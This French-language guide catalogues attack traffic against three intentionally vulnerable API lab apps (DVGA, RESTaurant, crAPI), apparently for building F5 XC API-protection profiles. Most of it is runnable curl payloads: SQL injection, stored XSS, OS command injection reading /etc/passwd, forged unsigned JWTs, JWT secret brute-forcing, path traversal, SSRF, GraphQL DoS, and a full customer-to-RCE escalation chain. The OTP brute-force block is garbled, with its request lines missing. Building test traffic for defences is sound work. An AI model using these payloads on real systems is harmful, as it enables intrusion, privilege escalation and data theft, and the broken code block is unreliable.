## Vue d'ensemble

Ce guide catalogue chaque endpoint d'API, vulnérabilité intentionnelle et charge d'attaque à travers les trois applications de test de sécurité API. Utilisez-le pour construire des modèles de génération de trafic pour le développement de profils de protection API F5 XC.

| Application | Protocole | Chemin | Port | Auth | Vulnérabilités |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | Aucune (admin: admin/password) | 25 scénarios |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 catégories OWASP API 2023 |
| **crAPI** | REST (microservices) | `/` | 8888 | JWT (Bearer) | 18+ défis |

### Variables d'environnement

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

## DVGA (Damn Vulnerable GraphQL Application)

**Endpoint GraphQL :** `POST ${ORIGIN}/dvga/graphql`
**IDE GraphiQL :** `GET ${ORIGIN}/dvga/`
**Identifiants administrateur :** admin / password

Toutes les interactions DVGA utilisent un seul endpoint (`/dvga/graphql`) avec des requêtes POST contenant des charges JSON `{"query":"..."}`.

### Vue d'ensemble du schéma

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← référence circulaire
```

### Référence des endpoints

| Opération | Type | Auth | Objectif |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | Non | Lister les pastes (injection SQL via filter) |
| `paste(id)` | Query | Non | Obtenir un paste unique |
| `me(token)` | Query | Non | Obtenir l'utilisateur par JWT (vulnérable à la falsification) |
| `systemHealth` | Query | Non | Vérification de santé |
| `systemUpdate` | Query | Non | Requête lente (~82s, vecteur DoS) |
| `systemDiagnostics(cmd)` | Query | admin/password | Exécuter des commandes OS autorisées |
| `createPaste(title, content, public)` | Mutation | Non | Créer un paste (XSS via content) |
| `importPaste(host, port, path, scheme)` | Mutation | Non | Importer un paste distant (SSRF, injection de commande) |
| `uploadPaste(filename, content)` | Mutation | Non | Téléverser un paste (traversée de chemin) |

### Catalogue des vulnérabilités

#### 1. Déni de service (6 scénarios)

**Attaque par requêtes groupées :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**Récursion profonde (références circulaires Owner/Paste) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**Requête à forte consommation de ressources (réponse ~82 secondes) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**Duplication de champs (répéter le champ 500+ fois) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**Attaque basée sur les alias (1000 opérations aliasées) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. Divulgation d'informations (5 scénarios)

**Introspection (énumération complète du schéma) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**Suggestions de champs (une faute de frappe révèle les champs valides) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**SSRF via importPaste (sondage des services internes) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. Injection (4 scénarios)

**Injection SQL via le paramètre filter :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**XSS stocké via createPaste :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**Injection de logs (usurpation du nom d'opération) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. Exécution de code (3 scénarios)

**Injection de commande OS via importPaste :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**Commande OS via systemDiagnostics (nécessite l'authentification admin) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. Contournement d'autorisation (3 scénarios)

**Falsification de token JWT (accepte les tokens non signés) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**Écriture de fichier arbitraire via uploadPaste (traversée de chemin) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

## API RESTaurant (Damn Vulnerable RESTaurant)

**Interface Swagger :** `${ORIGIN}/restaurant/docs`
**Spécification OpenAPI :** `${ORIGIN}/restaurant/openapi.json`
**Auth :** JWT via POST form-encoded vers `/restaurant/token`
**Rôles :** Customer (par défaut), Employee, Chef (admin)

### Configuration : Inscription et authentification

```bash
# Inscrire un utilisateur de test
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# Obtenir le token JWT (NOTE : form-encoded, pas JSON)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### Catalogue des vulnérabilités

#### API1:2023 — Violation de l'autorisation au niveau objet (BOLA)

**Modifier le profil d'un autre utilisateur :**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**Accéder aux commandes d'autres utilisateurs (énumérer les décalages) :**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — Authentification défaillante

**Force brute du secret faible JWT (le secret est composé de 6 chiffres : 97952) :**
```bash
# Décoder et falsifier les tokens sur jwt.io
# Secret: 97952 (force brute possible avec hashcat -a 3 -m 16500 token '?d?d?d?d?d?d')

# Falsifier un token Chef :
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# Signer avec le secret : 97952
```

#### API3:2023 — Violation de l'autorisation au niveau des propriétés d'objet (BOPLA)

**Assignation en masse du rôle de Customer à Chef :**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**Chemin d'escalade : Customer → Employee → Chef :**
```bash
# Étape 1 : Escalader vers Employee
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# Étape 2 : Escalader vers Chef
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — Violation de l'autorisation au niveau fonction (BFLA)

**Supprimer un élément du menu en tant que Customer (devrait nécessiter Employee+) :**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**Modifier le rôle d'un autre utilisateur :**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — Falsification de requête côté serveur (SSRF)

**Sondage des endpoints internes via image_url du menu (nécessite le rôle Employee) :**
```bash
# D'abord escalader vers Employee via BOPLA, puis :
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — Injection

**Injection de commande OS via les statistiques disque (nécessite le rôle Chef) :**
```bash
# Après escalade vers Chef :
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### Chaîne d'attaque complète : de Customer à Root

```bash
# 1. Inscription
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. Obtenir le token
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Escalader vers Chef (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Se ré-authentifier pour obtenir un token de niveau Chef
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. Injection de commande (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

## crAPI (OWASP Completely Ridiculous API)

**Interface Web :** `${CRAPI}/`
**MailHog :** `${CRAPI}/mailhog/` (capture d'emails pour la vérification)
**Auth :** Token JWT Bearer (RS256, vulnérable à la confusion d'algorithme)
**Architecture :** 7 microservices (identity, community, workshop, postgres, mongo, mailhog, web)

### Configuration : Inscription, vérification d'email, connexion

```bash
# 1. Inscription
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. Vérifier MailHog pour l'email de vérification
# Naviguer vers ${CRAPI}/mailhog/ ou utiliser l'API MailHog :
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. Connexion et obtention du token JWT
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

#### Défi 3 — Authentification défaillante : Force brute de l'OTP de réinitialisation de mot de passe

```bash

  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)

done
```

#### Défi 15 — Confusion d'algorithme JWT

```bash
# Falsifier un JWT avec l'algorithme "none" (pas de vérification de signature) :
# 1. Définir le header : {"alg":"none","typ":"JWT"} et l'encoder en base64url
# 2. Définir le payload : {"email":"admin@example.com","role":"admin"} et l'encoder en base64url
# 3. Joindre avec des points, laisser la signature vide : <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

### Phase 2 : Trafic d'attaque par catégorie OWASP

**Tests BOLA :** Énumérer les ID séquentiels, échanger les identifiants utilisateur dans les requêtes, accéder aux ressources sans propriété.

**Tests d'injection :** Charges SQL dans les paramètres filter/coupon, injection de requêtes GraphQL, injection de commandes OS via les champs de paramètres.

**Tests de contournement d'authentification :** Falsifier des tokens JWT, force brute des OTP, utiliser des versions d'API obsolètes, confusion d'algorithme.

**Tests SSRF :** URL internes dans les paramètres `importPaste`, `image_url` et `mechanic_api`.

**Tests DoS :** Attaques GraphQL par batch/récursion/alias, `repeat_request_if_failed` avec des compteurs élevés.

### Phase 3 : Chaînes d'attaque avec état

Certaines attaques nécessitent des séquences multi-étapes avec état :

1. **Chaîne d'escalade RESTaurant :** Inscription → Token → PATCH du rôle vers Chef → Ré-authentification → Injection de commande
2. **Flux complet crAPI :** Inscription → Vérification d'email (MailHog) → Connexion → Ajout de véhicule → Contact mécanicien (SSRF) → Manipulation de commande
3. **DVGA de la reconnaissance à l'exploitation :** Introspection → Découverte de systemDiagnostics → Force brute des identifiants admin → Exécution de commandes OS
